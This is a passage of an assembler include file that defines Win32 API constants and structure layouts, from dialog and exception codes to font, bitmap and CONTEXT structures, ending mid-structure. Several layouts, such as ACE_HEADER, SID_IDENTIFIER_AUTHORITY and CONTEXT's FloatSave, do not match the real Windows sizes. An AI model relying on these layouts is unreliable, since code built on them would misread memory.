CDM_SETCONTROLTEXT equ CDM_FIRST+4h
CDM_HIDECONTROL equ CDM_FIRST+5h
CDM_SETDEFEXT equ CDM_FIRST+6h
SIMULATED_FONTTYPE equ 8000h
PRINTER_FONTTYPE equ 4000h
SCREEN_FONTTYPE equ 2000h
BOLD_FONTTYPE equ 100h
ITALIC_FONTTYPE equ 200h
REGULAR_FONTTYPE equ 400h
WM_PSD_PAGESETUPDLG equ WM_USER
WM_PSD_FULLPAGERECT equ WM_USER+1
WM_PSD_MINMARGINRECT equ WM_USER+2
WM_PSD_MARGINRECT equ WM_USER+3
WM_PSD_GREEKTEXTRECT equ WM_USER+4
WM_PSD_ENVSTAMPRECT equ WM_USER+5
WM_PSD_YAFULLPAGERECT equ WM_USER+6
PSD_DEFAULTMINMARGINS equ 0h
PSD_INWININIINTLMEASURE equ 0h
PSD_MINMARGINS equ 1h
PSD_MARGINS equ 2h
PSD_INTHOUSANDTHSOFINCHES equ 4h
PSD_INHUNDREDTHSOFMILLIMETERS equ 8h
PSD_DISABLEMARGINS equ 10h
PSD_DISABLEPRINTER equ 20h
PSD_NOWARNING equ 80h
PSD_DISABLEORIENTATION equ 100h
PSD_RETURNDEFAULT equ 400h
PSD_DISABLEPAPER equ 200h
PSD_SHOWHELP equ 800h
PSD_ENABLEPAGESETUPHOOK equ 2000h
PSD_ENABLEPAGESETUPTEMPLATE equ 8000h
PSD_ENABLEPAGESETUPTEMPLATEHANDLE equ 20000h
PSD_ENABLEPAGEPAINTHOOK equ 40000h
PSD_DISABLEPAGEPAINTING equ 80000h
NM_FIRST equ 0-0
NM_LAST equ 0-99
DBG_CONTINUE equ 00010002h
DBG_TERMINATE_THREAD equ 40010003h
DBG_TERMINATE_PROCESS equ 40010004h
DBG_CONTROL_C equ 40010005h
DBG_CONTROL_BREAK equ 40010008h
DBG_EXCEPTION_NOT_HANDLED equ 80010001h
SIZE_OF_80387_REGISTERS equ 80
STATUS_WAIT_0 equ 00000000h
STATUS_ABANDONED_WAIT_0 equ 00000080h
STATUS_USER_APC equ 000000C0h
STATUS_TIMEOUT equ 00000102h
STATUS_PENDING equ 00000103h
STATUS_DATATYPE_MISALIGNMENT equ 80000002h
STATUS_BREAKPOINT equ 80000003h
STATUS_SINGLE_STEP equ 80000004h
STATUS_ACCESS_VIOLATION equ 0C0000005h
STATUS_IN_PAGE_ERROR equ 0C0000006h
STATUS_NO_MEMORY equ 0C0000017h
STATUS_ILLEGAL_INSTRUCTION equ 0C000001Dh
STATUS_NONCONTINUABLE_EXCEPTION equ 0C0000025h
STATUS_INVALID_DISPOSITION equ 0C0000026h
STATUS_ARRAY_BOUNDS_EXCEEDED equ 0C000008Ch
STATUS_FLOAT_DENORMAL_OPERAND equ 0C000008Dh
STATUS_FLOAT_DIVIDE_BY_ZERO equ 0C000008Eh
STATUS_FLOAT_INEXACT_RESULT equ 0C000008Fh
STATUS_FLOAT_INVALID_OPERATION equ 0C0000090h
STATUS_FLOAT_OVERFLOW equ 0C0000091h
STATUS_FLOAT_STACK_CHECK equ 0C0000092h
STATUS_FLOAT_UNDERFLOW equ 0C0000093h
STATUS_INTEGER_DIVIDE_BY_ZERO equ 0C0000094h
STATUS_INTEGER_OVERFLOW equ 0C0000095h
STATUS_PRIVILEGED_INSTRUCTION equ 0C0000096h
STATUS_STACK_OVERFLOW equ 0C00000FDh
STATUS_CONTROL_C_EXIT equ 0C000013Ah
EXCEPTION_CONTINUABLE equ 0
EXCEPTION_NONCONTINUABLE equ 1h
EXCEPTION_ACCESS_VIOLATION equ STATUS_ACCESS_VIOLATION
EXCEPTION_DATATYPE_MISALIGNMENT equ STATUS_DATATYPE_MISALIGNMENT
EXCEPTION_BREAKPOINT equ STATUS_BREAKPOINT
EXCEPTION_SINGLE_STEP equ STATUS_SINGLE_STEP
EXCEPTION_ARRAY_BOUNDS_EXCEEDED equ STATUS_ARRAY_BOUNDS_EXCEEDED
EXCEPTION_FLT_DENORMAL_OPERAND equ STATUS_FLOAT_DENORMAL_OPERAND
EXCEPTION_FLT_DIVIDE_BY_ZERO equ STATUS_FLOAT_DIVIDE_BY_ZERO
EXCEPTION_FLT_INEXACT_RESULT equ STATUS_FLOAT_INEXACT_RESULT
EXCEPTION_FLT_INVALID_OPERATION equ STATUS_FLOAT_INVALID_OPERATION
EXCEPTION_FLT_OVERFLOW equ STATUS_FLOAT_OVERFLOW
EXCEPTION_FLT_STACK_CHECK equ STATUS_FLOAT_STACK_CHECK
EXCEPTION_FLT_UNDERFLOW equ STATUS_FLOAT_UNDERFLOW
EXCEPTION_INT_DIVIDE_BY_ZERO equ STATUS_INTEGER_DIVIDE_BY_ZERO
EXCEPTION_INT_OVERFLOW equ STATUS_INTEGER_OVERFLOW
EXCEPTION_PRIV_INSTRUCTION equ STATUS_PRIVILEGED_INSTRUCTION
EXCEPTION_IN_PAGE_ERROR equ STATUS_IN_PAGE_ERROR
CONTEXT_i386 equ 00010000h
CONTEXT_i486 equ 00010000h
CONTEXT_CONTROL equ CONTEXT_i386|00000001h
CONTEXT_INTEGER equ CONTEXT_i386|00000002h
CONTEXT_SEGMENTS equ CONTEXT_i386|00000004h
CONTEXT_FLOATING_POINT equ CONTEXT_i386|00000008h
CONTEXT_DEBUG_REGISTERS equ CONTEXT_i386|00000010h
CONTEXT_FULL equ CONTEXT_CONTROL|CONTEXT_INTEGER|CONTEXT_SEGMENTS
IMAGE_DIRECTORY_ENTRY_EXPORT equ 0
IMAGE_DIRECTORY_ENTRY_IMPORT equ 1
IMAGE_DIRECTORY_ENTRY_RESOURCE equ 2
IMAGE_DIRECTORY_ENTRY_EXCEPTION equ 3
IMAGE_DIRECTORY_ENTRY_SECURITY equ 4
IMAGE_DIRECTORY_ENTRY_BASERELOC equ 5
IMAGE_DIRECTORY_ENTRY_DEBUG equ 6
IMAGE_DIRECTORY_ENTRY_COPYRIGHT equ 7
IMAGE_DIRECTORY_ENTRY_GLOBALPTR equ 8
IMAGE_DIRECTORY_ENTRY_TLS equ 9
IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG equ 10
IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT equ 11
IMAGE_DIRECTORY_ENTRY_IAT equ 12
IMAGE_NUMBEROF_DIRECTORY_ENTRIES equ 16
IMAGE_BITMAP equ 0
IMAGE_ICON equ 1
IMAGE_CURSOR equ 2
IMAGE_ENHMETAFILE equ 3
PROCESSOR_INTEL_386 equ 386
PROCESSOR_INTEL_486 equ 486
PROCESSOR_INTEL_PENTIUM equ 586
PROCESSOR_MIPS_R4000 equ 4000
PROCESSOR_ALPHA_21064 equ 21064
;-----------------------win32api structures-----------------------------
STRUC RECT
.left RESD 1
.top RESD 1
.right RESD 1
.bottom RESD 1
ENDSTRUC

STRUC POINT
.x RESD 1
.y RESD 1
ENDSTRUC

STRUC SIZEL
.x RESD 1
.y RESD 1
ENDSTRUC

STRUC MSG
.hwnd RESD 1
.message RESD 1
.wParam RESD 1
.lParam RESD 1
.time RESD 1
.pt RESB POINT_size
ENDSTRUC

STRUC SID_AND_ATTRIBUTES
.Sid RESD 1
.Attributes RESD 1
ENDSTRUC

STRUC SID_IDENTIFIER_AUTHORITY
.Value RESB 1
ENDSTRUC

STRUC OVERLAPPED
.Internal RESD 1
.InternalHigh RESD 1
.loffset RESD 1
.OffsetHigh RESD 1
.hEvent RESD 1
ENDSTRUC

STRUC SECURITY_ATTRIBUTES
.niLength RESD 1
.lpSecurityDescriptor RESD 1
.bInheritHandle RESD 1
ENDSTRUC

STRUC PROCESS_INFORMATION
.hProcess RESD 1
.hThread RESD 1
.dwProcessId RESD 1
.dwThreadId RESD 1
ENDSTRUC

STRUC FILETIME
.dwLowDateTime RESD 1
.dwHighDateTime RESD 1
ENDSTRUC

STRUC SYSTEMTIME
.wYear RESW 1
.wMonth RESW 1
.wDayOfWeek RESW 1
.wDay RESW 1
.wHour RESW 1
.wMinute RESW 1
.wSecond RESW 1
.wMilliseconds RESW 1
ENDSTRUC

STRUC COMMPROP
.wPacketiLength RESW 1
.wPacketVersion RESW 1
.dwServiceMask RESD 1
.dwReserved1 RESD 1
.dwMaxTxQueue RESD 1
.dwMaxRxQueue RESD 1
.dwMaxBaud RESD 1
.dwProvSubType RESD 1
.dwProvCapabilities RESD 1
.dwSettableParams RESD 1
.dwSettableBaud RESD 1
.wSettableData RESW 1
.wSettableStopParity RESW 1
.dwCurrentTxQueue RESD 1
.dwCurrentRxQueue RESD 1
.dwProvSpec1 RESD 1
.dwProvSpec2 RESD 1
.wcProvChar RESW 1
ENDSTRUC

STRUC COMSTAT
.fCtsHold RESD 1
.fDsrHold RESD 1
.fRlsdHold RESD 1
.fXoffHold RESD 1
.fXoffSent RESD 1
.fEof RESD 1
.fTxim RESD 1
.fReserved RESD 1
.cbInQue RESD 1
.cbOutQue RESD 1
ENDSTRUC

STRUC DCB
.DCBlength RESD 1
.BaudRate RESD 1
.fbits RESD 1
.wReserved RESW 1
.XonLim RESW 1
.XoffLim RESW 1
.ByteSize RESB 1
.Parity RESB 1
.StopBits RESB 1
.XonChar RESB 1
.XoffChar RESB 1
.ErrorChar RESB 1
.EofChar RESB 1
.EvtChar RESB 1
ENDSTRUC

STRUC COMMTIMEOUTS
.ReadIntervalTimeout RESD 1
.ReadTotalTimeoutMultiplier RESD 1
.ReadTotalTimeoutConstant RESD 1
.WriteTotalTimeoutMultiplier RESD 1
.WriteTotalTimeoutConstant RESD 1
ENDSTRUC

STRUC SYSTEM_INFO
.dwOemID RESD 1
.dwPageSize RESD 1
.lpMinimumApplicationAddress RESD 1
.lpMaximumApplicationAddress RESD 1
.dwActiveProcessorMask RESD 1
.dwNumberOrfProcessors RESD 1
.dwProcessorType RESD 1
.dwAllocationGranularity RESD 1
.wProcessorLevel RESW 1
.wProcessorRevision RESW 1
ENDSTRUC

STRUC MEMORYSTATUS
.dwiLength RESD 1
.dwMemoryLoad RESD 1
.dwTotalPhys RESD 1
.dwAvailPhys RESD 1
.dwTotalPageFile RESD 1
.dwAvailPageFile RESD 1
.dwTotalVirtual RESD 1
.dwAvailVirtual RESD 1
ENDSTRUC

STRUC TPMPARAMS
.cbSize RESD 1
.rcExclude RESB RECT_size
ENDSTRUC

STRUC GENERIC_MAPPING
.GenericRead RESD 1
.GenericWrite RESD 1
.GenericExecute RESD 1
.GenericAll RESD 1
ENDSTRUC

STRUC LUID
.LowPart RESD 1
.HighPart RESD 1
ENDSTRUC

STRUC LUID_AND_ATTRIBUTES
.pLuid RESD 1
.Attributes RESD 1
ENDSTRUC

STRUC ACL
.AclRevision RESB 1
.Sbz1 RESB 1
.AclSize RESW 1
.AceCount RESW 1
.Sbz2 RESW 1
ENDSTRUC

STRUC ACE_HEADER
.AceType RESB 1
.AceFlags RESB 1
.AceSize RESD 1
ENDSTRUC

STRUC ACCESS_ALLOWED_ACE
.Header RESD 1
.imask RESD 1
.SidStart RESD 1
ENDSTRUC

STRUC ACCESS_DENIED_ACE
.Header RESD 1
.imask RESD 1
.SidStart RESD 1
ENDSTRUC

STRUC SYSTEM_AUDIT_ACE
.Header RESD 1
.imask RESD 1
.SidStart RESD 1
ENDSTRUC

STRUC SYSTEM_ALARM_ACE
.Header RESD 1
.imask RESD 1
.SidStart RESD 1
ENDSTRUC

STRUC ACL_REVISION_INFORMATION
.AclRevision RESD 1
ENDSTRUC

STRUC ACL_SIZE_INFORMATION
.AceCount RESD 1
.AclBytesInUse RESD 1
.AclBytesFree RESD 1
ENDSTRUC

STRUC SECURITY_DESCRIPTOR
.Revision RESB 1
.Sbz1 RESB 1
.Control RESD 1
.Owner RESD 1
.lGroup RESD 1
.Sacl RESD 1
.Dacl RESD 1
ENDSTRUC

STRUC PRIVILEGE_SET
.PrivilegeCount RESD 1
.Control RESD 1
.Privilege RESD 1
ENDSTRUC

STRUC EXCEPTION_RECORD
.ExceptionCode RESD 1
.ExceptionFlags RESD 1
.pExceptionRecord RESD 1
.ExceptionAddress RESD 1
.NumberParameters RESD 1
.ExceptionInformation RESD 1
ENDSTRUC

STRUC EXCEPTION_DEBUG_INFO
.pExceptionRecord RESD 1
.dwFirstChance RESD 1
ENDSTRUC

STRUC CREATE_THREAD_DEBUG_INFO
.hThread RESD 1
.lpThreadLocalBase RESD 1
.lpStartAddress RESD 1
ENDSTRUC

STRUC CREATE_PROCESS_DEBUG_INFO
.hFile RESD 1
.hProcess RESD 1
.hThread RESD 1
.lpBaseOfImage RESD 1
.dwDebugInfoFileOffset RESD 1
.nDebugInfoSize RESD 1
.lpThreadLocalBase RESD 1
.lpStartAddress RESD 1
.lpImageName RESD 1
.fUnicode RESD 1
ENDSTRUC

STRUC EXIT_THREAD_DEBUG_INFO
.dwExitCode RESD 1
ENDSTRUC

STRUC EXIT_PROCESS_DEBUG_INFO
.dwExitCode RESD 1
ENDSTRUC

STRUC LOAD_DLL_DEBUG_INFO
.hFile RESD 1
.lpBaseOfDll RESD 1
.dwDebugInfoFileOffset RESD 1
.nDebugInfoSize RESD 1
.lpImageName RESD 1
.fUnicode RESW 1
ENDSTRUC

STRUC UNLOAD_DLL_DEBUG_INFO
.lpBaseOfDll RESD 1
ENDSTRUC

STRUC OUTPUT_DEBUG_STRING_INFO
.lpDebugStringData RESD 1
.fUnicode RESW 1
.nDebugStringiLength RESW 1
ENDSTRUC

STRUC RIP_INFO
.dwError RESD 1
.dwType RESD 1
ENDSTRUC

STRUC OFSTRUCT
.cBytes RESB 1
.fFixedDisk RESB 1
.nErrCode RESW 1
.Reserved1 RESW 1
.Reserved2 RESW 1
.szPathName RESB 1
ENDSTRUC

STRUC WNDCLASSEX
.cbSize RESD 1
.style RESD 1
.lpfnWndProc RESD 1
.cbClsExtra RESD 1
.cbWndExtra RESD 1
.hInstance RESD 1
.hIcon RESD 1
.hCursor RESD 1
.hbrBackground RESD 1
.lpszMenuName RESD 1
.lpszClassName RESD 1
.hIconSm RESD 1
ENDSTRUC

STRUC WNDCLASS
.style RESD 1
.lpfnWndProc RESD 1
.cbClsExtra RESD 1
.cbWndExtra RESD 1
.hInstance RESD 1
.hIcon RESD 1
.hCursor RESD 1
.hbrBackground RESD 1
.lpszMenuName RESD 1
.lpszClassName RESD 1
ENDSTRUC

STRUC CRITICAL_SECTION
.Par1 RESD 1
.Par2 RESD 1
.Par3 RESD 1
.Par4 RESD 1
.Par5 RESD 1
.Par6 RESD 1
ENDSTRUC

STRUC BY_HANDLE_FILE_INFORMATION
.dwFileAttributes RESD 1
.ftCreationTime RESB FILETIME_size
.ftLastAccessTime RESB FILETIME_size
.ftLastWriteTime RESB FILETIME_size
.dwVolumeSerialNumber RESD 1
.nFileSizeHigh RESD 1
.nFileSizeLow RESD 1
.nNumberOfLinks RESD 1
.nFileIndexHigh RESD 1
.nFileIndexLow RESD 1
ENDSTRUC

STRUC MEMORY_BASIC_INFORMATION
.BaseAddress RESD 1
.AllocationBase RESD 1
.AllocationProtect RESD 1
.RegionSize RESD 1
.State RESD 1
.Protect RESD 1
.lType RESD 1
ENDSTRUC

STRUC EVENTLOGRECORD
.iLength RESD 1
.Reserved RESD 1
.RecordNumber RESD 1
.TimeGenerated RESD 1
.TimeWritten RESD 1
.EventID RESD 1
.EventType RESW 1
.NumStrings RESW 1
.EventCategory RESW 1
.ReservedFlags RESW 1
.ClosingRecordNumber RESD 1
.StringOffset RESD 1
.UserSidiLength RESD 1
.UserSidOffset RESD 1
.DataiLength RESD 1
.DataOffset RESD 1
ENDSTRUC

STRUC TOKEN_GROUPS
.GroupCount RESD 1
.Groups RESD 1
ENDSTRUC

STRUC TOKEN_PRIVILEGES
.PrivilegeCount RESD 1
.Privileges RESD 1
ENDSTRUC

STRUC FLOATING_SAVE_AREA
.ControlWord RESD 1
.StatusWord RESD 1
.TagWord RESD 1
.ErrorOffset RESD 1
.ErrorSelector RESD 1
.DataOffset RESD 1
.DataSelector RESD 1
.RegisterArea RESB 1
.Cr0NpxState RESD 1
ENDSTRUC

STRUC CONTEXT
.ContextFlags RESD 1
.iDr0 RESD 1
.iDr1 RESD 1
.iDr2 RESD 1
.iDr3 RESD 1
.iDr6 RESD 1
.iDr7 RESD 1
.FloatSave RESD 1
.regGs RESD 1
.regFs RESD 1
.regEs RESD 1
.regDs RESD 1
.regEdi RESD 1
.regEsi RESD 1
.regEbx RESD 1
.regEdx RESD 1
.regEcx RESD 1
.regEax RESD 1
.regEbp RESD 1
.regEip RESD 1
.regCs RESD 1
.regFlag RESD 1
.regEsp RESD 1
.regSs RESD 1
ENDSTRUC

STRUC EXCEPTION_POINTERS
.pExceptionRecord RESD 1
.ContextRecord RESD 1
ENDSTRUC

STRUC LDT_BYTES
.BaseMid RESB 1
.Flags1 RESB 1
.Flags2 RESB 1
.BaseHi RESB 1
ENDSTRUC

STRUC LDT_ENTRY
.LimitLow RESW 1
.BaseLow RESW 1
.HiWord RESD 1
ENDSTRUC

STRUC TIME_ZONE_INFORMATION
.Bias RESD 1
.StandardName RESW 1
.StandardDate RESD 1
.StandardBias RESD 1
.DaylightName RESW 1
.DaylightDate RESD 1
.DaylightBias RESD 1
ENDSTRUC

STRUC WIN32_STREAM_ID
.dwStreamID RESD 1
.dwStreamAttributes RESD 1
.dwStreamSizeLow RESD 1
.dwStreamSizeHigh RESD 1
.dwStreamNameSize RESD 1
.cStreamName RESB 1
ENDSTRUC

STRUC STARTUPINFO
.cb RESD 1
.lpReserved RESD 1
.lpDesktop RESD 1
.lpTitle RESD 1
.dwX RESD 1
.dwY RESD 1
.dwXSize RESD 1
.dwYSize RESD 1
.dwXCountChars RESD 1
.dwYCountChars RESD 1
.dwFillAttribute RESD 1
.dwFlags RESD 1
.wShowWindow RESW 1
.cbReserved2 RESW 1
.lpReserved2 RESB 1
.hStdInput RESD 1
.hStdOutput RESD 1
.hStdError RESD 1
ENDSTRUC

STRUC WIN32_FIND_DATA
.dwFileAttributes RESD 1
.ftCreationTime RESB FILETIME_size
.ftLastAccessTime RESB FILETIME_size
.ftLastWriteTime RESB FILETIME_size
.nFileSizeHigh RESD 1
.nFileSizeLow RESD 1
.dwReserved0 RESD 1
.dwReserved1 RESD 1
.cFileName RESB MAX_PATH
.cAlternate RESB 14 
ENDSTRUC

STRUC CPINFO
.MaxCharSize RESD 1
.DefaultChar RESB 1
.LeadByte RESB 1
ENDSTRUC

STRUC NUMBERFMT
.NumDigits RESD 1
.LeadingZero RESD 1
.Grouping RESD 1
.lpDecimalSep RESD 1
.lpThousandSep RESD 1
.NegativeOrder RESD 1
ENDSTRUC

STRUC CURRENCYFMT
.NumDigits RESD 1
.LeadingZero RESD 1
.Grouping RESD 1
.lpDecimalSep RESD 1
.lpThousandSep RESD 1
.NegativeOrder RESD 1
.PositiveOrder RESD 1
.lpCurrencySymbol RESD 1
ENDSTRUC

STRUC COORD
.x RESW 1
.y RESW 1
ENDSTRUC

STRUC SMALL_RECT
.left RESW 1
.top RESW 1
.right RESW 1
.bottom RESW 1
ENDSTRUC

STRUC KEY_EVENT_RECORD
.bKeyDown RESD 1
.wRepeatCount RESW 1
.wVirtualKeyCode RESW 1
.wVirtualScanCode RESW 1
.uChar RESW 1
.dwControlKeyState RESD 1
ENDSTRUC

STRUC MOUSE_EVENT_RECORD
.dwMousePosition RESD 1
.dwButtonState RESD 1
.dwControlKeyState RESD 1
.dwEventFlags RESD 1
ENDSTRUC

STRUC WINDOW_BUFFER_SIZE_RECORD
.dwSize RESD 1
ENDSTRUC

STRUC MENU_EVENT_RECORD
.dwCommandId RESD 1
ENDSTRUC

STRUC FOCUS_EVENT_RECORD
.bSetFocus RESD 1
ENDSTRUC

STRUC CHAR_INFO
.Char RESW 1
.Attributes RESW 1
ENDSTRUC

STRUC CONSOLE_SCREEN_BUFFER_INFO
.dwSize RESD 1
.dwCursorPosition RESD 1
.wAttributes RESW 1
.srWindow RESB SMALL_RECT_size
.dwMaximumWindowSize RESD 1
ENDSTRUC

STRUC CONSOLE_CURSOR_INFO
.dwSize RESD 1
.bVisible RESD 1
ENDSTRUC

STRUC XFORM
.eM11 RESQ 1
.eM12 RESQ 1
.eM21 RESQ 1
.eM22 RESQ 1
.ex RESQ 1
.ey RESQ 1
ENDSTRUC

STRUC BITMAP
.bmType RESD 1
.bmWidth RESD 1
.bmHeight RESD 1
.bmWidthBytes RESD 1
.bmPlanes RESW 1
.bmBitsPixel RESW 1
.bmBits RESD 1
ENDSTRUC

STRUC RGBTRIPLE
.rgbtBlue RESB 1
.rgbtGreen RESB 1
.rgbtRed RESB 1
ENDSTRUC

STRUC RGBQUAD
.rgbBlue RESB 1
.rgbGreen RESB 1
.rgbRed RESB 1
.rgbReserved RESB 1
ENDSTRUC

STRUC BITMAPCOREHEADER
.bcSize RESD 1
.bcWidth RESW 1
.bcHeight RESW 1
.bcPlanes RESW 1
.bcBitCount RESW 1
ENDSTRUC

STRUC BITMAPINFOHEADER
.biSize RESD 1
.biWidth RESD 1
.biHeight RESD 1
.biPlanes RESW 1
.biBitCount RESW 1
.biCompression RESD 1
.biSizeImage RESD 1
.biXPelsPerMeter RESD 1
.biYPelsPerMeter RESD 1
.biClrUsed RESD 1
.biClrImportant RESD 1
ENDSTRUC

STRUC BITMAPINFO
.bmiHeader RESD 1
.bmiColors RESD 1
ENDSTRUC

STRUC BITMAPCOREINFO
.bmciHeader RESD 1
.bmciColors RESD 1
ENDSTRUC

STRUC BITMAPFILEHEADER
.bfType RESW 1
.bfSize RESD 1
.bfReserved1 RESW 1
.bfReserved2 RESW 1
.bfOffBits RESD 1
ENDSTRUC

STRUC HANDLETABLE
.objectHandle RESD 1
ENDSTRUC

STRUC METARECORD
.rdSize RESD 1
.rdFunction RESW 1
.rdParm1 RESW 1
ENDSTRUC

STRUC METAFILEPICT
.imm RESD 1
.xExt RESD 1
.yExt RESD 1
.hMF RESD 1
ENDSTRUC

STRUC METAHEADER
.mtType RESW 1
.mtHeaderSize RESW 1
.mtVersion RESW 1
.mtSize RESD 1
.mtNoObjects RESW 1
.mtMaxRecord RESD 1
.mtNoParameters RESW 1
ENDSTRUC

STRUC ENHMETARECORD
.iType RESD 1
.nSize RESD 1
.dParm1 RESD 1
ENDSTRUC

STRUC ENHMETAHEADER
.iType RESD 1
.nSize RESD 1
.rclBounds RESB RECT_size
.rclFrame RESB RECT_size
.dSignature RESD 1
.nVersion RESD 1
.nBytes RESD 1
.nRecords RESD 1
.nHandles RESW 1
.sReserved RESW 1
.nDescription RESD 1
.offDescription RESD 1
.nPalEntries RESD 1
.szlDevice RESD 1
.szlMillimeters RESD 1
ENDSTRUC

STRUC TEXTMETRIC
.tmHeight RESD 1
.tmAscent RESD 1
.tmDescent RESD 1
.tmInternalLeading RESD 1
.tmExternalLeading RESD 1
.tmAveCharWidth RESD 1
.tmMaxCharWidth RESD 1
.tmWeight RESD 1
.tmOverhang RESD 1
.tmDigitizedAspectX RESD 1
.tmDigitizedAspectY RESD 1
.tmFirstChar RESB 1
.tmLastChar RESB 1
.tmDefaultChar RESB 1
.tmBreakChar RESB 1
.tmItalic RESB 1
.tmUnderlined RESB 1
.tmStruckOut RESB 1
.tmPitchAndFamily RESB 1
.tmCharSet RESB 1
ENDSTRUC

STRUC NEWTEXTMETRIC
.tmHeight RESD 1
.tmAscent RESD 1
.tmDescent RESD 1
.tmInternalLeading RESD 1
.tmExternalLeading RESD 1
.tmAveCharWidth RESD 1
.tmMaxCharWidth RESD 1
.tmWeight RESD 1
.tmOverhang RESD 1
.tmDigitizedAspectX RESD 1
.tmDigitizedAspectY RESD 1
.tmFirstChar RESB 1
.tmLastChar RESB 1
.tmDefaultChar RESB 1
.tmBreakChar RESB 1
.tmItalic RESB 1
.tmUnderlined RESB 1
.tmStruckOut RESB 1
.tmPitchAndFamily RESB 1
.tmCharSet RESB 1
.ntmFlags RESD 1
.ntmSizeEM RESD 1
.ntmCellHeight RESD 1
.ntmAveWidth RESD 1
ENDSTRUC

STRUC PELARRAY
.paXCount RESD 1
.paYCount RESD 1
.paXExt RESD 1
.paYExt RESD 1
.paRGBs RESW 1
ENDSTRUC

STRUC LOGBRUSH
.lbStyle RESD 1
.lbColor RESD 1
.lbHatch RESD 1
ENDSTRUC

STRUC LOGPEN
.lopnStyle RESD 1
.lopnWidth RESD 1
.lopnColor RESD 1
ENDSTRUC

STRUC EXTLOGPEN
.elpPenStyle RESD 1
.elpWidth RESD 1
.elpBrushStyle RESD 1
.elpColor RESD 1
.elpHatch RESD 1
.elpNumEntries RESD 1
.elpStyleEntry RESD 1
ENDSTRUC

STRUC PALETTEENTRY
.peRed RESB 1
.peGreen RESB 1
.peBlue RESB 1
.peFlags RESB 1
ENDSTRUC

STRUC LOGPALETTE
.palVersion RESW 1
.palNumEntries RESW 1
.palPalEntry RESD 1
ENDSTRUC

STRUC LOGFONT
.lfHeight RESD 1
.lfWidth RESD 1
.lfEscapement RESD 1
.lfOrientation RESD 1
.lfWeight RESD 1
.lfItalic RESB 1
.lfUnderline RESB 1
.lfStrikeOut RESB 1
.lfCharSet RESB 1
.lfOutPrecision RESB 1
.lfClipPrecision RESB 1
.lfQuality RESB 1
.lfPitchAndFamily RESB 1
.lfFaceName RESB LF_FACESIZE
ENDSTRUC

STRUC NONCLIENTMETRICS
.cbSize RESD 1
.iBorderWidth RESD 1
.iScrollWidth RESD 1
.iScrollHeight RESD 1
.iCaptionWidth RESD 1
.iCaptionHeight RESD 1
.lfCaptionFont RESD 1
.iSMCaptionWidth RESD 1
.iSMCaptionHeight RESD 1
.lfSMCaptionFont RESD 1
.iMenuWidth RESD 1
.iMenuHeight RESD 1
.lfMenuFont RESD 1
.lfStatusFont RESD 1
.lfMessageFont RESD 1
ENDSTRUC

STRUC ENUMLOGFONT
.elfLogFont RESD 1
.elfFullName RESB 1
.elfStyle RESB 1
ENDSTRUC

STRUC PANOSE
.ulculture RESD 1
.bFamilyType RESB 1
.bSerifStyle RESB 1
.bWeight RESB 1
.bProportion RESB 1
.bContrast RESB 1
.bStrokeVariation RESB 1
.bArmStyle RESB 1
.bLetterform RESB 1
.bMidline RESB 1
.bXHeight RESB 1
ENDSTRUC

STRUC EXTLOGFONT
.elfLogFont RESD 1
.elfFullName RESB 1
.elfStyle RESB 1
.elfVersion RESD 1
.elfStyleSize RESD 1
.elfMatch RESD 1
.elfReserved RESD 1
.elfVendorId RESB 1
.elfCulture RESD 1
.elfPanose RESD 1
ENDSTRUC

STRUC DEVMODE
.dmDeviceName RESB 1
.dmSpecVersion RESW 1
.dmDriverVersion RESW 1
.dmSize RESW 1
.dmDriverExtra RESW 1
.dmFields RESD 1
.dmOrientation RESW 1
.dmPaperSize RESW 1
.dmPaperiLength RESW 1
.dmPaperWidth RESW 1
.dmScale RESW 1
.dmCopies RESW 1
.dmDefaultSource RESW 1
.dmPrintQuality RESW 1
.dmColor RESW 1
.dmDuplex RESW 1
.dmYResolution RESW 1
.dmTTOption RESW 1
.dmCollate RESW 1
.dmFormName RESB CCHFORMNAME
.dmUnusedPadding RESW 1
.dmBitsPerPel RESW 1
.dmPelsWidth RESD 1
.dmPelsHeight RESD 1
.dmDisplayFlags RESD 1
.dmDisplayFrequency RESD 1
ENDSTRUC

STRUC RGNDATAHEADER
.dwSize RESD 1
.iType RESD 1
.nCount RESD 1
.nRgnSize RESD 1
.rcBound RESB RECT_size
ENDSTRUC

STRUC RGNDATA
.rdh RESD 1
.Buffer RESB 1
ENDSTRUC

STRUC ABC
.abcA RESD 1
.abcB RESD 1
.abcC RESD 1
ENDSTRUC

STRUC ABCFLOAT
.abcfA RESQ 1
.abcfB RESQ 1
.abcfC RESQ 1
ENDSTRUC

STRUC OUTLINETEXTMETRIC
.otmSize RESD 1
.otmTextMetrics RESD 1
.otmFiller RESB 1
.otmPanoseNumber RESD 1
.otmfsSelection RESD 1
.otmfsType RESD 1
.otmsCharSlopeRise RESD 1
.otmsCharSlopeRun RESD 1
.otmItalicAngle RESD 1
.otmEMSquare RESD 1
.otmAscent RESD 1
.otmDescent RESD 1
.otmLineGap RESD 1
.otmsCapEmHeight RESD 1
.otmsXHeight RESD 1
.otmrcFontBox RESB RECT_size
.otmMacAscent RESD 1
.otmMacDescent RESD 1
.otmMacLineGap RESD 1
.otmusMinimumPPEM RESD 1
.otmptSubscriptSize RESD 1
.otmptSubscriptOffset RESD 1
.otmptSuperscriptSize RESD 1
.otmptSuperscriptOffset RESD 1
.otmsStrikeoutSize RESD 1
.otmsStrikeoutPosition RESD 1
.otmsUnderscorePosition RESD 1
.otmsUnderscoreSize RESD 1
.otmpFamilyName RESD 1
.otmpFaceName RESD 1
.otmpStyleName RESD 1
.otmpFullName RESD 1
ENDSTRUC

STRUC POLYTEXT
.x RESD 1
.y RESD 1
.n RESD 1
.lpStr RESD 1
.uiFlags RESD 1
.rcl RESB RECT_size
.pdx RESD 1
ENDSTRUC

STRUC FIXED
.fract RESW 1
.Value RESW 1
ENDSTRUC

STRUC MAT2
.eM11 RESD 1
.eM12 RESD 1
.eM21 RESD 1
.eM22 RESD 1
ENDSTRUC

STRUC GLYPHMETRICS
.gmBlackBoxX RESD 1
.gmBlackBoxY RESD 1
.gmptGlyphOrigin RESD 1
.gmCellIncX RESW 1
.gmCellIncY RESW 1
ENDSTRUC

STRUC POINTFX
.x RESD 1
.y RESD 1
ENDSTRUC

STRUC TTPOLYCURVE
.wType RESW 1
.cpfx RESW 1
.apfx RESD 1
ENDSTRUC

STRUC TTPOLYGONHEADER
.cb RESD 1
.dwType RESD 1
.pfxStart RESD 1
ENDSTRUC

STRUC RASTERIZER_STATUS
.nSize RESW 1
.wFlags RESW 1
.nLanguageID RESW 1
ENDSTRUC

STRUC COLORADJUSTMENT
.caSize RESW 1
.caFlags RESW 1
.caIlluminantIndex RESW 1
